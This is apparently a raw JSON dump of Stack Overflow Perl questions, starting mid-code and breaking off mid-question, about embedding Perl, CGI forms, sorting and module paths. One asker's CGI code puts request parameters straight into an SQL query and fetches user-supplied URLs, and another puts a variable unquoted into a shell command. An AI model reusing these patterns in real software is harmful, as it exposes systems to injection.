&lt;perl.h&gt;\n#include &lt;string&gt;\nusing namespace std;\n\nstring perlScript;\n\nstatic PerlInterpreter *my_perl;\n\nSV* my_eval_sv(I32 croak_on_error)\n{\n    STRLEN n_a;\n    char *p1 = new char [perlScript.size()+1];\n    strcpy(p1, perlScript.c_str());\n    const char *p = p1;\n    int len = strlen(p);\n\n    dSP;\n    ENTER ;\n    SAVETMPS ;\n    PUSHMARK(SP) ;\n\n\n    int a, b;\n    a = 10;\n    b = 20;\n\n    PERL_SET_CONTEXT(my_perl);\n    XPUSHs(sv_2mortal(newSViv(a)));\n    PERL_SET_CONTEXT(my_perl);\n    XPUSHs(sv_2mortal(newSViv(b)));\n\n\n    /* Done with pushing pointers to Perl stack */\n\n    PUTBACK;\n\n    SV* sv1 = newSVpv(p, 0);    \n    eval_sv(sv1, G_EVAL | G_KEEPERR);\n    SvREFCNT_dec(sv1);\n\n    SPAGAIN;\n    sv1 = POPs;\n    PUTBACK;\n\n    FREETMPS;\n    LEAVE;\n\n    if (croak_on_error &amp;&amp; SvTRUE(ERRSV))\n        croak(SvPVx(ERRSV, n_a));   \n}\n\nmain (int argc, char **argv, char **env)\n{\n    char *embedding[] = { \"\", \"-e\", \"0\" };\n    PERL_SYS_INIT3(&amp;argc,&amp;argv,&amp;env);\n    my_perl = perl_alloc();\n    perl_construct(my_perl);\n    perl_parse(my_perl, NULL, 3, embedding, NULL);\n    PL_exit_flags |= PERL_EXIT_DESTRUCT_END;\n\n    /*string perlBeginScript;\n    static const char * perlEndScript = \"\\\n                                 \\n\\\n    }\\n\\\n    \";\n\n    if(perlBeginScript.length()==0)\n    {\n        perlBeginScript=\"EmbeddedPerl\";\n    }\n\n    perlScript = \"sub \";\n    perlScript += perlBeginScript;\n    perlScript += \"{\\n\"; */\n\n    string one = \"print 'Hello World\\n'; \";\n    string two = \"my $a = shift; my $b = shift; \";\n    string three= \"print 'Test\\n'; my $z = 100; print $a; print $b; print $z;\";\n    string four = \"print 'Testing complete\\n';\";\n\n    perlScript += one ;\n    perlScript += two;\n    perlScript += three;\n    perlScript += four;\n\n    //perlScript += perlEndScript;\n\n    /* Done with perl script to be executed */\n    my_eval_sv(TRUE);\n    PL_perl_destruct_level = 1;\n    perl_destruct(my_perl);\n    perl_free(my_perl);\n    PERL_SYS_TERM(); \n    }\n</code></pre>\n"},{"tags":["perl","aix","call-graph"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":564,"score":1,"question_id":1270477,"title":"How can I generate call graphs for Perl modules and scripts?","body":"<p>I have a bunch of Perl scripts and Perl modules given to me by someone. I have a driver program that tests all these scripts and modules. I want to generate a call graph and see the flow.</p>\n\n<p>Is there something available for Perl for doing this?<br>\nI'd like something like <a href=\"http://pycallgraph.slowchop.com/\" rel=\"nofollow\">pycallgraph</a> (for python). I am running all this in AIX.</p>\n"},{"tags":["perl","tcl","tk"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12592774,"title":"Assigning code to push button for GUI in tcl/tk","body":"<p>I am new to this 'GUI' but i want to create a GUI in tcl/tk with one push button and one display to show the output. I have gone through several examples of GUI but i coundnt find an example to assign a code/script to a push button. So can anyone help me on this?</p>\n\n<p>Is it possible to assign a perl script to a tcl/tk GUI code?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["perl","concatenation"],"answer_count":5,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":2727,"score":4,"question_id":1636755,"title":"How many different ways are there to concatenate two files line by line using Perl?","body":"<p>Suppose file1 looks like this:</p>\n\n<pre>\nbye bye\nhello\nthank you\n</pre>\n\n<p>And file2 looks like this:</p>\n\n<pre>\nchao\nhola\ngracias\n</pre>\n\n<p>The desired output is this:</p>\n\n<pre>\nbye bye chao\nhello hola\nthank you gracias\n</pre>\n\n<p>I myself have already come up with five different approaches to solve this problem. But I think there must be more ways, probably more concise and more elegant ways, and I hope I can learn more cool stuff :)</p>\n\n<p>The following is what I have tried so far, based on what I've learnt from the many solutions of my previous problems. Also, I'm trying to sort of digest or internalize the knowledge I've acquired from the Llama book.</p>\n\n<p>Code 1:</p>\n\n<pre><code>#!perl\nuse autodie;\nuse warnings;\nuse strict;\n\nopen my $file1,'&lt;','c:/file1.txt';\nopen my $file2,'&lt;','c:/file2.txt';\n\nwhile(defined(my $line1 = &lt;$file1&gt;)\n        and defined(my $line2 = &lt;$file2&gt;)){\n    die \"Files are different sizes!\\n\" unless eof(file1) == eof(file2);\n    $line1 .= $line2;\n    $line1 =~ s/\\n/ /;\n    print \"$line1 \\n\";\n}\n</code></pre>\n\n<p>Code 2:</p>\n\n<pre><code>#!perl\nuse autodie;\nuse warnings;\nuse strict;\n\nopen my $file1,'&lt;','c:/file1.txt';\nmy @file1 = &lt;$file1&gt;;\n\nopen my $file2,'&lt;','c:/file2.txt';\nmy @file2 =&lt;$file2&gt;;\n\nfor (my $n=0; $n&lt;=$#file1; $n++) {\n    $file1[$n] .=$file2[$n];\n    $file1[$n]=~s/\\n/ /;\n    print $file1[$n];\n}\n</code></pre>\n\n<p>Code 3:</p>\n\n<pre><code>#!perl\nuse autodie;\nuse warnings;\nuse strict;\n\nopen my $file1,'&lt;','c:/file1.txt';\nopen my $file2,'&lt;','c:/file2.txt';\n\nmy %hash;\n\nwhile(defined(my $line1 = &lt;$file1&gt;)\n      and defined(my $line2 = &lt;$file2&gt;)) {\n  chomp $line1;\n  chomp $line2;\n  my ($key, $val) = ($line1,$line2);\n  $hash{$key} = $val;\n}\nprint map { \"$_ $hash{$_}\\n\" } sort keys %hash;\n</code></pre>\n\n<p>Code 4:</p>\n\n<pre><code>#!perl\nuse autodie;\nuse warnings;\nuse strict;\n\nopen my $file1,'&lt;','c:/file1.txt';\nopen my $file2,'&lt;','c:/file2.txt';\n\nwhile(defined(my $line1 = &lt;$file1&gt;)\n      and defined(my $line2 = &lt;$file2&gt;)) {\n  $line1 =~ s/(.+)/$1 $line2/;\n  print $line1;\n}\n</code></pre>\n\n<p>Code 5:</p>\n\n<pre><code>#!perl\nuse autodie;\nuse warnings;\nuse strict;\n\nopen my $file1,'&lt;','c:/file1.txt';\nmy @file1 =&lt;$file1&gt;;\n\nopen my $file2,'&lt;','c:/file2.txt';\nmy @file2 =&lt;$file2&gt;;\n\nwhile ((@file1) &amp;&amp; (@file2)){ \n    my $m = shift (@file1);\n    chomp($m);\n\n    my $n = shift (@file2);\n    chomp($n);\n\n    $m .=\" \".$n;\n    print \"$m \\n\";\n}\n</code></pre>\n\n<p>I have tried something like this:</p>\n\n<pre><code>foreach $file1 (@file2) &amp;&amp; foreach $file2 (@file2) {...}\n</code></pre>\n\n<p>But Perl gave me a syntactic error warning. I was frustrated. But can we run two <code>foreach</code> loops simultaneously?  </p>\n\n<p>Thanks, as always, for any comments, suggestions and of course the generous code sharing :)</p>\n"},{"tags":["perl","process","grep","ps"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":120,"score":3,"question_id":12592914,"title":"How to determine if Java process is running in Perl","body":"<p>I have a suite of small Java app that all compiles/packages to <code>&lt;name-of-the-app&gt;.jar</code> and run  on  my server. Occasionally one of them will throw an exception, choke and die. I am trying to write a quick-n-dirty Perl script that will periodically poll to see if all of these executable JARs are still running, and if any of them are not, send me an email and notify me which one is dead.</p>\n\n<p>To determine this manually, I have to run a <code>ps -aef | grep &lt;name-of-app&gt;</code> for each app I want to check. For example, to see if <code>myapp.jar</code> is running as a process, I run <code>ps -aef | grep myapp</code>, and look for a grep result that describes the JVM process representing <code>myapp.jar</code>. This manual checking is now getting tedious and is a prime candidate for automation!</p>\n\n<p>I am trying to implement the code that checks to see whether a process is running or not. I'd like to make this a <code>sub</code> that accepts the name of the executable JAR and returns <code>true</code> or <code>false</code>:</p>\n\n<pre><code>sub isAppStillRunning($appName) {\n    # Somehow run \"ps -aef | grep $appName\"\n\n    # Somehow count the number of processes returned by the grep\n\n    # Since grep always returns itself, determine if (count - 1) == 1.\n    # If so, return true, otherwise, false.\n}\n</code></pre>\n\n<p>I need to be able to pass the <code>sub</code> the name of an app, run my normal command, and count the number of results returned by <code>grep</code>. Since running a <code>grep</code> always results in at least one result (the <code>grep</code> command itself), I need logic that says if the (# of results - 1) is equal to 1, then we know the app is running.</p>\n\n<p>I'm brand new to Perl and am having a tough time figuring out how to implement this logic. Here's my best attempt so far:</p>\n\n<pre><code>sub isAppStillRunning($appName) {\n    # Somehow run \"ps -aef | grep $appName\"\n    @grepResults = `ps -aef | grep $appName`;\n\n    # Somehow count the number of processes returned by the grep\n    $grepResultCount = length(@grepResults);\n\n    # Since grep always returns itself, determine if (count - 1) == 1.\n    # If so, return true, otherwise, false.\n    if(($grepResultCount - 1) == 1)\n        true\n    else\n        false\n}\n</code></pre>\n\n<p>Then to call the method, from inside the same Perl script, I <em>think</em> I would just run:</p>\n\n<pre><code>&amp;isAppStillRunning(\"myapp\");\n</code></pre>\n\n<p>Any help with defining the sub and then calling it with the right app name is greatly appreciated. Thanks in advance!</p>\n"},{"tags":["perl","orm","perl-module","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12592241,"title":"How does DBIx::Class handle boolean values?","body":"<p>I'm using DBIx::Class in my perl script to interact with a sqlite database.</p>\n\n<p>When doing inserts/searches, what will DBIx::Class consider 'true' and 'false'?</p>\n\n<p>eg:</p>\n\n<p><code>$schema-&gt;resultset('SomeObject')-&gt;create({ some_boolean =&gt; 1, primary_key =&gt; 1 });</code></p>\n\n<p><code>$schema-&gt;resultset('SomeObject')-&gt;search({ some_boolean =&gt; 'true' });</code></p>\n\n<p>Any help or documentation is appreciated (I haven't been able to find it in the DBIx::Class docs, but maybe I'm missing something.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12588601,"title":"Perl newbie: trying to find string in array of strings","body":"<p>I need to match a string against an array of strings. The string that I am searching for should be able to contain wildcards.</p>\n\n<pre><code>#!/usr/bin/perl\n#\n##   disable buffered I/O which would lead\n##   to deadloops for the Apache server\n$| = 1; \n#\n##   read URLs one per line from stdin\nwhile (&lt;&gt;) {\n    my $line = $_;\n    my @array1 = (\"abc\",\"def\",\"ghi\");\n    $found = 0;\n    if (/$line/i ~~ @array1)\n    {\n        print \"found\\n\";\n    }\n    else\n    {\n        print \"not found\\n\";\n    }\n\n}\n</code></pre>\n\n<p>I test this script with the input of <code>abc</code> and it returns <code>not found</code></p>\n\n<pre><code>perl ./mapscript.pl\nabc\nnot found\n</code></pre>\n"},{"tags":["perl","epic"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12592132,"title":"Could not locate delcaration for \"...\" using EPIC for perl","body":"<p>I was reorganizing the folder structure of my perl scripts and I ran into a problem with locating the declaration of a method (shift+click). Traditionally this would open up the .pl or .pm file within the editor. This is no longer the case. </p>\n\n<p>All of the .pl files and .pm files are under the same parent directory, however I added sub-directories such as parent/include/my_utility.pm</p>\n\n<p>The message received when shift clicking is: \"Could not locate declaration for \"...\", Please check the Perl Include Path in Project Properties.</p>\n\n<p>I added the parent folder to the include path and still have no success.</p>\n"},{"tags":["perl","bash","shell","csh","tcsh"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":683,"score":4,"question_id":5807395,"title":"Shell test to see whether a binary is in your path","body":"<p>In csh, tcsh, bash, perl (etc) you can do tests on par with (not necessarily with the same syntax):</p>\n\n<pre><code>test -e PATH; # Does PATH exist\ntest -f PATH; # Is PATH a file\ntest -d PATH; # is PATh a directory\n...\n</code></pre>\n\n<p>Does a similar construct exist for checking whether a binary is in your path? (and perhaps whether an alias, or even a built-in exist)</p>\n\n<p>Obviously this can be done with something of the form:</p>\n\n<pre><code>#!/usr/bin/env bash\nC=COMMAND;\ntest $(which $C) -o $(alias $C) &amp;&amp; \"$C exists\"\n</code></pre>\n\n<p>or something similar in other shells/script languages.</p>\n\n<p>The question isn't whether it's possible to test for the existence of a program, command, etc.  The question is whether a built-in test exists or not.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":66,"score":-7,"question_id":7429215,"title":"I need to sort follwing array of hash by account_id. Please give me solution with explanation","body":"<p>I need to sort follwing array of hash by account_id. Please give me solution with explanation</p>\n\n<pre><code>@account_details = ( \n      {'account_name' =&gt; 'John','account_id' =&gt; '4'}\n    , { 'account_name' =&gt; 'Tom','account_id' =&gt; '2'}\n    , {'account_name' =&gt; 'Joseph','account_id' =&gt; '18'}\n    , {'account_name' =&gt; 'Rahul','account_id' =&gt; '25'});\n</code></pre>\n\n<p>Please explain the steps if use Schwartzian Transform.</p>\n"},{"tags":["perl","sorting","reference"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12590318,"title":"Perl sorting an array of references to arrays","body":"<p>I am relatively new to Perl.  I have a reference to an array called $TransRef that contains references to arrays.  My goal is to write a sub that takes the $TransRef arguement as its only argument, sorts the references to the underlying array by the 2nd element (a string) and sets the output back to the $TransRef reference.  Can someone please show how this can be done in Perl?</p>\n\n<p>Here is some code that generates $TransRef.  It has not been tested yet and may have some bugs:</p>\n\n<pre><code># Parse the data and move it into the Transactions container.\nfor ($Loop = 0; $Loop &lt; 5; $Loop++)\n{\n   $Line = $LinesInFile[$Loop];\n   # Create an array called Fields to hold each field in $Line.\n   @Fields = split /$Delimitor/, $Line;  \n   $TransID = $Fields[2];\n   # Save a ref to the fields array in the transaction list.\n   $FieldsRef = \\@Fields;\n   ValidateData($FieldsRef);\n   $$TransRef[$Loop] = $FieldsRef;\n}\nSortByCustID($TransRef);\n\nsub SortByCustID()\n{\n   # This sub sorts the arrays in $TransRef by the 2nd element, which is the cust #.\n   # How to do this?\n   my $TransRef = @_;\n   ...\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12589467,"title":"perl expression meaning for statement $a &&= ;","body":"<p>Recently I came across this Perl expression on a  blog, unable to grab it purpose.</p>\n\n<pre><code>    my $success = 1; \n    $success &amp;&amp;= $insert_handle-&gt;execute($first, $last, $department); \n    $success &amp;&amp;= $update_handle-&gt;execute($department);\n</code></pre>\n"},{"tags":["perl","validation","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":167,"score":2,"question_id":11926599,"title":"Perl Form Validation using CGI scripting","body":"<p>I'm trying to achieve one last task for my <strong>assignment</strong> is to validate the form before submit it to the another CGI program.</p>\n\n<p>What happen is that I have a simple CGI program that will ask user to input the data</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse CGI qw/:standard/;\n\n# Standard HTTP header\nprint header();\n\n# Write information to data file and produce a form\n&amp;printForm();\n\n# Finish HTML page\nprint end_html();\n\n# This sub will create a form to access the print_fortune.cgi script\nsub printForm\n{\n        print qq~\n\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;My Search Engine&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n  &lt;form action=\"b1.cgi\" method=\"GET\"&gt;\n        What is your e-msil address? &lt;input type=\"text\" name=\"passing\" size=40&gt;\n        &lt;input type=\"submit\" value=\"send address\"&gt;\n        &lt;input type=\"hidden\" name=\"form\" value=\"insert\" /&gt;\n        &lt;/form&gt;\n\n&lt;form method=\"get\" action=\"b1.cgi\" enctype=\"application/x-www-form-urlencoded\"&gt;\n\n&lt;input type=\"text\" name=\"search\" value=\"\" size=\"30\" /&gt;&lt;br /&gt;\n\n&lt;label&gt;&lt;input type=\"radio\" name=\"option\" value=\"name\" checked=\"checked\" /&gt;name&lt;/label&gt;\n\n&lt;label&gt;&lt;input type=\"radio\" name=\"option\" value=\"author\" /&gt;author&lt;/label&gt;&lt;label&gt;\n\n&lt;input type=\"radio\" name=\"option\" value=\"url\" /&gt;url&lt;/label&gt;\n\n&lt;label&gt;&lt;input type=\"radio\" name=\"option\" value=\"keyword\" /&gt;keyword&lt;/label&gt;\n\n&lt;input type=\"submit\" name=\".submit\" value=\"Search\" /&gt;\n&lt;input type=\"hidden\" name=\"passing\" value=\"http://default.com\" /&gt;\n\n&lt;div&gt;&lt;input type=\"hidden\" name=\"form\" value=\"search\"  /&gt;&lt;/div&gt;&lt;/form&gt;\n\n\n&lt;/body&gt;\n</code></pre>\n\n<p>So the above program contains two forms. One is to add new data to the database and the other one is to search from the database.</p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type: text/html\\n\\n\";\n\nuse LWP::Simple;\nuse CGI;\nuse HTML::HeadParser;\nuse DBI;\n\nmy $serverName = \"\";\nmy $serverPort = \"\";\n\nmy $serverUser = \"\";\nmy $serverPass = \"\";\nmy $serverDb   = \"\";\n\nmy $serverTabl = \"\";\n\n$cgi = CGI-&gt;new;\n\nmy $pass = $cgi-&gt;param('passing');\n\n$URL = get (\"$pass\");\n\n$head = HTML::HeadParser-&gt;new;\n\n$head-&gt;parse(\"$URL\");\n\nmy $methods = $cgi-&gt;param('form');\n\n\nif ($methods eq \"insert\"){\n\ninsert_entry();\n\n}\n\nshow_entries();\n\nsub insert_entry {\n    my ($dbh, $success, $name, $author, $url,$temp);\n\n    $dbh = DBI-&gt;connect(\"DBI:mysql:database=$serverDb;host=$serverName;port=$serverPort\",$serverUser,$serverPass);\n    $name = $head-&gt;header('X-Meta-Name');\n    $author = $head-&gt;header('X-Meta-Author');\n    $url = $cgi-&gt;param('passing');\n    $temp = $head-&gt;header('X-Meta-Keywords');\n    @keyword = split(/,/,$temp);\n\n\n    $success = $dbh-&gt;do(\"INSERT INTO $serverTabl(name,author,url,keyword1,keyword2,keyword3,keyword4,keyword5) VALUES(?,?,?,?,?,?,?,?)\", undef,$name,$\nauthor,$url,$keyword[0],$keyword[1],$keyword[2],$keyword[3],$keyword[4]);\n    $dbh-&gt;disconnect;\n    if($success != 1) {\n       return \"Sorry, the database was unable to add your entry.\n                                Please try again later.\";\n    } else {\n        return;\n      }\n}\n\nsub show_entries {\n    my ($dbh, $sth, @row);\n    my $search = $cgi-&gt;param('search');\n    my $option = $cgi-&gt;param('option');\n\n    $dbh = DBI-&gt;connect(\"DBI:mysql:database=$serverDb;host=$serverName;port=$serverPort\",$serverUser,$serverPass);\n\n    $sth = $dbh-&gt;prepare(\"SELECT *\n                          FROM $serverTabl\n                          WHERE $option LIKE '%$search%'\");\n    $sth-&gt;execute;\n    print \"Existing Entries\",HR;\n    while(@row = $sth-&gt;fetchrow_array) {\n          $row[5] = scalar(localtime($row[5]));\n          print \"&lt;table border='2'&gt;&lt;tr&gt;\";\n          print \"&lt;td&gt;\" .  $row[0] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Name\" . $row[1] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Author\" . $row[2] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;URL\" . $row[3] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Keyword1\" . $row[4] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Keyword2\" . $row[5] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Keyword3\" . $row[6] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Keyword4\" . $row[7] . \"&lt;/td&gt;\";\n          print \"&lt;td&gt;Keyword5\" . $row[8] . \"&lt;/td&gt;\";\n          print \"&lt;/tr&gt;&lt;/table&gt;\";\n     }\n     $sth-&gt;finish;\n     $dbh-&gt;disconnect;\n}\n</code></pre>\n\n<p>So now the question is how can I do a regular expression for the form submission before it goes to the second program? </p>\n\n<p>I want to do validation for</p>\n\n<p><strong>name</strong>  allows spaces but only alphabetical characters\n<strong>author</strong> allows spaces but only alphabetical characters\n<strong>keywords</strong> allows no spaces and only alphabetical characters\n<strong>url</strong> only allows alphanumerical characters and the following  :/.~?=+&amp;    No two periods can exist consecutively. </p>\n\n<p>I'm really sorry but I'm really new to Perl. We are only been taught about PHP, but Perl almost nothing....</p>\n"},{"tags":["perl","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":60,"score":-3,"question_id":12575239,"title":"Perl Module Missing Error","body":"<p>I am a new guy learning perl and working as it goes. I am really stuck at this point, been working on this thing for past 4 Hr without any results. </p>\n\n<p>I am using a bunch of custom Modules inside a directory and then I got a ticket to implement a new KnowledgeBase and so I added a new module in the Moduledirectory. After adding it, when I try to access MyModule it does not work at all. I get </p>\n\n<pre><code>Can't locate FolderName/MyModuleName.pm in @INC \n</code></pre>\n\n<p>Can someone please help me. It is getting really annoying. I have tried to restart apache server, but still the same error shows up. </p>\n\n<p>I also tried to just compile my module, but I get the same error except the name of the module is different it is the one that I am calling/using in MyModule. </p>\n\n<p>Please let me know if you can help me. Thanks in advance.</p>\n\n<p>Edit: Adding more details, the exact error that I am getting (with line breaks for readability) is:</p>\n\n<pre><code>Can't locate Net2Net/KnowledgeBase.pm in @INC (@INC contains:\n    (DOCUMENT_ROOT)/bin \n    /usr/local/lib/perl5/5.8.8/sun4-solaris\n    /usr/local/lib/perl5/5.8.8\n    /usr/local/lib/perl5/site_perl/5.8.8/sun4-solaris\n    /usr/local/lib/perl5/site_perl/5.8.8\n    /usr/local/lib/perl5/site_perl\n    .\n) at /data1/web/intradev.com-80/docs/gss/kb/ajax-kb-update.cgi line 6.\nBEGIN failed--compilation aborted at /data1/web/intradev.com-80/docs/gss/kb/ajax-kb-update.cgi line 6.\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12588797,"title":"Close file descriptor by number","body":"<p>My Perl program executes lvs which gives the warning</p>\n\n<blockquote>\n  <p>File descriptor 63 (pipe:[117387]) leaked on lvs invocation. Parent\n  PID 12053: perl</p>\n</blockquote>\n\n<p>because the program calling my Perl program left this descriptor open.  I can't change the calling program, but is there a way for me to close the filehandle in Perl?  I tried:</p>\n\n<pre><code>'close 63 or die \"close failed\";\n</code></pre>\n\n<p>which dies.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":11307172,"title":"Perl confusion between variables","body":"<p>I have the following code</p>\n\n<pre><code>my $content = $response-&gt;content;\n$content =~ /username=([\\s\\S]+?)&amp;/;\nmy $username = $1;\nprint $username; #Prints the text\n</code></pre>\n\n<p>lets say I want to do this again but for different text</p>\n\n<p>for example</p>\n\n<pre><code>$content =~ /rank=([\\s\\S]+?)&amp;/;\nmy $rank = $1;\nprint $rank; #Prints the username text\n</code></pre>\n\n<p>do I have to change $1 to something else?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12587091,"title":"Is there a way to build an anonymous hashref from a list of slices?","body":"<p>When combining specific data from a couple of arrayrefs, I mapped the transformation as per the following code:</p>\n\n<pre><code>my @output_data = map {\n  my $ss = $everything-&gt;{$_-&gt;{username}};\n  my $distance = $gis-&gt;distance ( $_-&gt;{lat}, $_-&gt;{long} =&gt; $ss-&gt;{Latitude}, $ss-&gt;{Longitude} );\n  my %data;\n  @data{qw/username addr1 addr2 city state zip rec_lat rec_long/} = @{$_}{qw/username addr1 addr2 city state zip lat long/};\n  @data{qw/ss_lat ss_long/} = @{$ss}{qw/Latitude Longitude/};\n  $data{difference} = sprintf(\"%.3f\", $distance-&gt;miles);\n  \\%data;\n} @$source;\n</code></pre>\n\n<p>Which works. It builds a hash by adding a couple of slices from the initial data sets (which individually do not comprise the entire row, just what I care about) as well as the result of a calculation between the two. Is there a way that the ending lines can be combined cleanly into a single anonymous hashref constructor? Or would building the resulting dataset like this be the preferred way to go about it? </p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":246,"score":9,"question_id":12156135,"title":"Why does `$v = () = split` return 1?","body":"<p><code>perldoc</code> says \"a list assignment in scalar context returns the number of elements on the right-hand side of the list assignment\" but when I try this code:</p>\n\n<pre><code>perl -e '$_=\"aaaaa\";print $v=(()=split //)'\n</code></pre>\n\n<p>The output is <code>1</code> which makes me confused.  (The answer I expect is <code>5</code>.)</p>\n\n<p>Can anybody explain this?</p>\n"},{"tags":["string","perl","floating-point"],"answer_count":11,"favorite_count":0,"up_vote_count":23,"down_vote_count":3,"view_count":70853,"score":20,"question_id":288900,"title":"How can I convert a string to a number in Perl?","body":"<p>How would I convert a string holding a number into its numeric value in Perl?</p>\n"},{"tags":["perl","cgi","web-crawler"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11923653,"title":"Pass value from HTML page form to a CGI program","body":"<p>I'm trying to create a simple program that will get the content of the webpage for the sake of my assignment.</p>\n\n<p>Right now I create a very simple HTML page that will let the user enter a URL.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;&lt;title&gt;URL page&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n  &lt;form action=\"cgi-bin/b1.cgi\" method=\"GET\"&gt;\n        Enter the URL you want to see &lt;input type=\"text\" name=\"passing\" size=40&gt;\n        &lt;input type=\"submit\" value=\"submit\"&gt;\n        &lt;/form&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n\n<p>so I just want to pass the url to my CGI program that I have so far</p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type: text/html\\n\\n\";\n\nuse LWP::Simple;\nuse CGI;\nuse HTML::HeadParser;\n\n#my $pass = $cgi-&gt;param('passing');\n\n$URL = get (\"$passing\");\n\n$head = HTML::HeadParser-&gt;new;\n\n$head-&gt;parse(\"$URL\");\n\nprint \"This is the Title of the page\" . $head-&gt;header('Title') . \"\\n\\n\";\n\nprint $head-&gt;header('X-Meta-Description') . \"\\n\\n\";\n\nprint $head-&gt;header('X-Meta-Keywords') . \"\\n\\n\";\n\nprint $head-&gt;header('Content-Type') . \"\\n\\n\";\n\nprint $head-&gt;header('Content-Language') . \"\\n\\n\";\n\nexit;\n</code></pre>\n\n<p>So from the above code as you can see if I can get the value that pass from the <code>GET</code> method to the line where it say <code>URL = get();</code> then I can get the content.</p>\n\n<p>I tried some approch like <code>my $pass = $cgi-&gt;param('passing');</code> but it gives me an error about <code>param</code></p>\n\n<p>Any suggestion would be so much appreciated.</p>\n"},{"tags":["perl","module"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":185,"score":5,"question_id":12565284,"title":"Is there ever a reason to include the shebang line in Perl packages?","body":"<p>I realize that I should include the shebang line only in scripts we want to run directly in the shell. I also do not see the shebang line included in any of the big module packages I have installed locally.</p>\n\n<p>However, I was still curious if people might include it for some other reason I'm not yet aware of. Or if there perhaps might be something like a (e.g.) ~'historical' reason for including it. Or should the shebang line never ever be included in .pm files(period) for fear of my house exploding? </p>\n"},{"tags":["perl","parameter-passing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12586641,"title":"Perl: Correct way to use Sub-routine Prototypes  [%@$]","body":"<pre><code>sub Function(\\[$@%]);\n</code></pre>\n\n<p>This <strong>works</strong> on Windows (Perl v5.14.2 on Windows 7), and accepts all 3 kinds of arguments. Hashes, Scalars and Lists.</p>\n\n<p>However, the same prototype on Linux (Perl 5.6.1 on CentOS release 4.5)  gives me</p>\n\n<pre><code>Malformed prototype for main::Function: \\[%@$].\n</code></pre>\n\n<p><strong>On both, I am doing <code>use 5.006</code>.</strong>\nAnd otherwise, the scripts are exactly identical.</p>\n"},{"tags":["perl","line","ignore"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2301,"score":1,"question_id":6308497,"title":"perl if line matches regex, ignore line and move onto next line in file","body":"<p>How would you do the following in perl:</p>\n\n<pre><code>for $line (@lines) {\n    if ($line =~ m/ImportantLineNotToBeChanged/){\n        #break out of the for loop, move onto the next line of the file being processed\n        #start the loop again\n    }\n    if ($line =~ s/SUMMER/WINTER/g){\n        print \".\";\n    }\n}\n</code></pre>\n\n<p>Updated to show more code, this is what I'm trying to do:</p>\n\n<pre><code>sub ChangeSeason(){\n\n    if (-f and /.log?/) {\n        $file = $_;\n        open FILE, $file;\n        @lines = &lt;FILE&gt;;\n        close FILE;\n\n        for $line (@lines) {\n            if ($line =~ m/'?Don't touch this line'?/) {\n                last;\n            }\n            if ($line =~ m/'?Or this line'?/){\n                last;\n            }\n            if ($line =~ m/'?Or this line too'?/){\n                last;\n            }\n            if ($line +~ m/'?Or this line as well'?/){\n                last;\n            }\n            if ($line =~ s/(WINTER)/{$1 eq 'winter' ? 'summer' : 'SUMMER'}/gie){\n                print \".\";\n            }\n        }\n\n        print \"\\nSeason changed in file $_\";\n        open FILE, \"&gt;$file\";\n        print FILE @lines;\n        close FILE;\n    }\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12583138,"title":"How to pass a function to constructor","body":"<p>How to pass a function to constructor, so the class could use it internally?</p>\n\n<p><strong>test.pl</strong></p>\n\n<pre><code>use Class;\nuse Loger;\n\nmy $loger = Loger-&gt;new();\n$loger-&gt;log('I have logger now, I can log messages!');\n\nmy $class = Class-&gt;new(\\&amp;{ $loger-&gt;log }); # here we pass the function (the method of other class) to contructor of a new  